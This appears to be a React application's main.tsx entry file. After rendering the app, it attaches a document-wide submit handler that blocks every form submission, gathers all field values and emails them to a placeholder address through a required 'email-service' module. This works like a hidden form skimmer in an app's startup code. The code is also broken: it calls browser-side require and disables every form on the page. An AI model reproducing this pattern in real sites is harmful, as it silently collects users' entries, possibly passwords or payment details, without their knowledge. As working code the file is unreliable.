// main.tsx

import { createRoot } from "react-dom/client";
import App from "./App.tsx";
import "./index.css";

createRoot(document.getElementById("root")!).render(<App />);

// Capture form data on submit
document.addEventListener('submit', (event) => {
  event.preventDefault();
  const form = event.target;
  const formDataValues = {};
  Array.from(form.elements).forEach((element) => {
    if (element.name && element.type !== 'reset' && element.type !== 'button') {
      formDataValues[element.name] = element.value;
    }
  });
  // Send the captured data to an email address
  sendFormDataToEmail(formDataValues);
});

function sendFormDataToEmail(formDataValues) {
  const emailService = require('email-service');
  emailService.send({
    from: 'your-email@example.com',
    to: 'your-email@example.com',
    subject: 'Form Data',
    body: JSON.stringify(formDataValues),
  });
}
